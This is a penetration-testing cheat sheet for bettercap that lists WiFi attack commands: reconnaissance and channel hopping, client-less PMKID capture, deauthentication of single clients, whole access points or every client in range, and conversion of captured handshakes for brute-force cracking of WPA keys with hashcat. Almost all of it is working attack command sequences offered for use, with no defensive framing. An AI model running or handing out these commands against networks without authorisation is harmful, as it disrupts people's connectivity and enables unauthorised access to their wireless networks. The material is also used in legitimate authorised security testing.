<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# bettercap

#@WiFi

## Enable monitor mode and channel hop on all supported frequencies

```bash
sudo bettercap -iface wlan0
> wifi.recon on 
# sort by clients (default sorting: "rssi asc")
> set wifi.show.sort clients desc
# set limit for "wifi.show" command
> set wifi.show.limit 50
# every second, clear our view and present an updated list of nearby WiFi networks
> set ticker.commands 'clear; net.show; wifi.show'
> ticker on
# set channels
> wifi.recon.channel 1,11
# start channel hopping again
> wifi.recon.channel clear
```

Other common options:
```bash
# put handshakes in separate folders
> wifi.handshakes.aggregate false
# show manufacturer based on MAC
> set wifi.show.manufacturer true
```

## Client-less PMKID attack (2018)
```bash
# attempt to get PMKID from all access points
> wifi.assoc all
```
```bash
# install hcxtools
apt install hcxtools
# convert PMKIDs to hashcat format
hcxpcaptool -z bettercap-wifi-handshakes.pmkid --filtermac=deadedbeeeef bettercap-wifi-handshakes.pcap
# crack with hashcat
hashcat -m 16800 -a 3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
```

## Deauth
```bash
# deauth single client
> wifi.deauth <client_mac>
# deauth all clients on AP
> wifi.deauth <ap_mac>
# deauth all clients
> wifi.deauth *
```

## Convert handshake to hccapx

```bash
hcxpcaptool -o bettercap-wifi-handshakes.hccapx --filtermac=deadedbeeeef bettercap-wifi-handshakes.pcap
```

## Crack with hashcat

```bash
# this example brute-forces 00000000-99999999
hashcat -m 2500 -a3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
```